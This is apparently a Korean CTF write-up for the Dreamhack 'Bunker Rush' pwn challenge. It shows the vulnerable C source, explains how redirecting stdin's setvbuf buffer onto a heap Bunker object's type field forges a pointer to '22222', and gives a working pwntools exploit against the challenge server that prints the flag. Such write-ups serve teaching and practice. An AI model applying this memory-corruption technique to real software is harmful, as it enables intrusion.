---
title: Dreamhack - Bunker Rush
date: 2026-01-09 15:56:31 +0900
categories: [Labs, Dreamhack]
---

소스 코드는 주어져 있다.

```c
//gcc chal.c -o chal
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>

#define BOXER 1
#define YELLOW 2
#define YELLOW_WIN "22222"

typedef struct {
  char name[16];
  long HP;
  long type;
  void (*build)(void *);
  void (*destroyed)(void *);
} Bunker;

typedef struct {
  char name[16];
  long HP;
  long type;
  void (*build)();
  void (*destroyed)();
} Hatchery;

void proc_init ()
{
  setvbuf (stdin, 0, 2, 0);
  setvbuf (stdout, 0, 2, 0);
  setvbuf (stderr, 0, 2, 0);
}

int read_input (char *buf, int len)
{
  int ret;

  ret = read (0, buf, len);

  if (ret < 0)
  {
    fprintf (stderr, "read error!\n");
    exit (1);
  }

  if (buf[ret-1] == '\n')
    buf[ret-1] = '\0';

  return ret;
}

int read_number ()
{
  char buf[16];
  int ret;
  int number;

  ret = scanf (" %d", &number);

  return number;
}

void buildHatchery(Hatchery* this)
{
  puts("Your drone is transformed to Hatchery");
}

void destroyedHatchery(Hatchery* this)
{
  puts("Hatchery is destructed...");
}

Hatchery* newHatchery(long hp) 
{
  Hatchery* hatchery = (Hatchery*)malloc(sizeof(Hatchery));

  strcpy(hatchery->name, "Hatchery");
  hatchery->build = buildHatchery;
  hatchery->destroyed = destroyedHatchery;
  //Boxer changed this line to comment.
  //hatchery->type = YELLOW;
  hatchery->HP = hp;

  return hatchery;
}

void buildBunker(Bunker* this)
{
  puts("SCV starts to build a bunker");
}

void destroyedBunker(Bunker* this)
{
  puts("Bunker is destructed...");
  if(this->type && !strcmp ((char*)(this->type), YELLOW_WIN))
    system("cat flag");
}

Bunker* newBunker(long hp) 
{
  Bunker* bunker = (Bunker*)malloc(sizeof(Bunker));

  strcpy(bunker->name, "Bunker");
  bunker->build = buildBunker;
  bunker->destroyed = destroyedBunker;
  //Yellow changed this line to comment.
  //bunker->type = BOXER;
  bunker->HP = hp;

  return bunker;
}

char canwin='N';
void BuildHatchery() 
{
  puts ("your drone moved to outside.");

  Hatchery* hatchery = newHatchery(0x1250);
  hatchery->build(hatchery);
  Bunker* bunker = newBunker(0x350);
  bunker->build(bunker);

  puts("your drone came out and attacked bunker!");
  puts("now can you beat BoxeR? [y/N]");
  scanf(" %c", &canwin);

  if((char)canwin != 'N') {
    puts("Drones finally destroyed the bunker!");
    bunker->destroyed(bunker);
    puts("Mission Success");
    bunker = NULL;
  } else {
    puts("Bunker is completed");
    hatchery->destroyed(hatchery);
    puts("Failed to mission");
    hatchery = NULL;
  }

  sleep(1);
  exit(0);
}

#define DEFAULT_SIZE 1024
char * buffer = 0;
long size = 0;
void BunkerRushStudy () 
{
  int ret;
  unsigned course;

  printf("your buffer: %p\n", buffer);
  puts("Select your course");
  printf(">> ");
  course = read_number();

  if (course > 2) {
    return;
  }

  if (course < 2) {
    if (buffer == NULL) {
      buffer = (char*)malloc(DEFAULT_SIZE);
      size = DEFAULT_SIZE;
    }
    ret = setvbuf(stdin, buffer, course, size);
  } else {
    ret = setvbuf(stdin, 0, course, 0);
  }

  if (ret < 0) {
    puts("study fail...");
    exit(1);
  }
  puts("Finish and sleep.");  
}

void BuildSpawningPool() {
  
  printf("buffer: ");
  scanf("%lu", &buffer);
  printf("size: ");
  scanf("%lu", &size);

  if (size >0x10000)
    size = 0;
}
void print_menu ()
{
  puts("1. Build Hatchery");
  puts("2. Study Bunkering");
  printf(">> ");
}

int main ()
{
  proc_init(); 
  puts("======================================");
  puts("    Mission: build another Hatchery   ");
  puts("======================================");

  while (1) {
    int menu;
    print_menu();
    menu = read_number();

    switch (menu) {
      case 1:
        BuildHatchery();
        break;

      case 2:
        BunkerRushStudy();
        break;

      case 0x22222:
        BuildSpawningPool();
        break;
        
      default:
        break;
    }
  }
}

```

1번 메뉴는 해처리와 벙커 객체를 생성하고 입력에 따라 벙커 객체 또는 해처리 객체를 파괴한다.

2번 메뉴는 버퍼의 주소를 출력해주고, setvbuf에 사용자의 입력을 받아 mode 인자에 넘겨준다. 만약 버퍼가 아직 할당되지 않았다면 할당해주고 이 작업을 수행한다. 

```c
  if (course < 2) {
    if (buffer == NULL) {
      buffer = (char*)malloc(DEFAULT_SIZE);
      size = DEFAULT_SIZE;
    }
    ret = setvbuf(stdin, buffer, course, size);
  } else {
    ret = setvbuf(stdin, 0, course, 0);
  }
```

위 코드에서 ret = setvbuf(stdin, buffer, course, size); 이렇게 setvbuf를 호출하는데,

이렇게 인자를 넘겨주면 우리가 입력을 할 경우 이 버퍼에 그 값이 저장된다. 원래 여기를 0 으로 주면 libc 내부의 버퍼를 사용한다. 

이 동작을 잘 기억해두자.

3번 메뉴는 0x22222 를 입력해야 진입할 수 있는데, buffer의 주소와 size 값을 조작할 수 있다.

우리의 목표는 

```c
void destroyedBunker(Bunker* this)
{
  puts("Bunker is destructed...");
  if(this->type && !strcmp ((char*)(this->type), YELLOW_WIN))
    system("cat flag");
}
```

여기서 조건을 만족시켜 system 함수가 실행되도록 해야한다. 

this→type 값이 널이면 안되고, *(this→type) 값이 “22222” 와 같아야한다. 유의할 점은 this→type = “22222” 가 아니라, type 변수가 가지고 있는 주소가 이 값을 가져야한다. 

그럼 어떻게 플래그를 획득할 수 있을까?

1. 2번 메뉴를 통해 buffer를 할당받는다.
2. 다시 2번 메뉴를 통해 buffer의 주소를 가져오고 이 버퍼와 destroyedBunker에 인자로 들어가는 Bunker의 type과의 거리를 측정한다. 
3. 0x22222 메뉴로 가서 buffer의 주소를 버퍼의 주소와 위에서 구한 오프셋을 써서 buffer + offset으로 바꾼다.
4. 2번 메뉴를 통해 stdin이 사용할 버퍼를 buffer + offset 로 바꾼다.
5. 1번 메뉴로 진입하면 y\N 입력을 받는데 N만 아니면 다 참이 되도록 구현이 되어 있기 때문에 페이로드를 적절히 구성하여 보낸다. 

5번에 대해서는 익스 코드에서 더 자세히 설명하겠다.

```python
from pwn import *

# p = process("./chal")
p = remote("host8.dreamhack.games", 17693)

# gdb.attach(p)

p.sendlineafter(b">> ",b'2')
p.sendlineafter(b">> ",b'0')

p.sendlineafter(b">> ",b'2')
buffer = int(p.recvline().split(b": ")[1],16)
info(f"buffer : {buffer:#x}")
p.sendlineafter(b">> ",b'0')

buffer2type = buffer + 0x468

p.sendlineafter(b">> ",b'139810')
p.sendlineafter(b": ",str(buffer2type).encode())
p.sendlineafter(b": ",b'50')

# pause()

p.sendlineafter(b">> ",b'2')
p.sendlineafter(b">> ",b'0')

payload = p64(buffer2type + 0x8)
payload += b"22222\0"
p.sendlineafter(b">> ",b'1')

p.sendafter(b"]\n",payload)
p.interactive()
```

위 코드에서 페이로드가 저렇게 구성된 이유를 설명하자면 다음과 같다.

지금 저 페이로드를 보내기 전 상태에서는 우리가 입력한 내용이 buffer2type에 들어간다. setvbuf로 stdin의 버퍼를 바꿔주었기 때문이다.

buffer2type + 0x8는 바로 다음에 나오는 22222 때문이다. type = 22222가 아니라 *type = 22222 여야 하기 때문에 22222를 값으로 가진 주소를 넣어줘야한다. 우리의 입력은 위에서 말했듯 buffer2type에 들어가고, 이는 Bunker→type의 위치와 같다. 이 type은 long으로 8바이트이기 때문에 p64로 패킹해서 보내면 type에 buffer2type+0x8이 들어간다. btype+0x8에는 22222가 들어가 있기 때문에 strcmp를 수행하면 같다고 나오고 조건문을 통과해 플래그를 획득할 수 있다.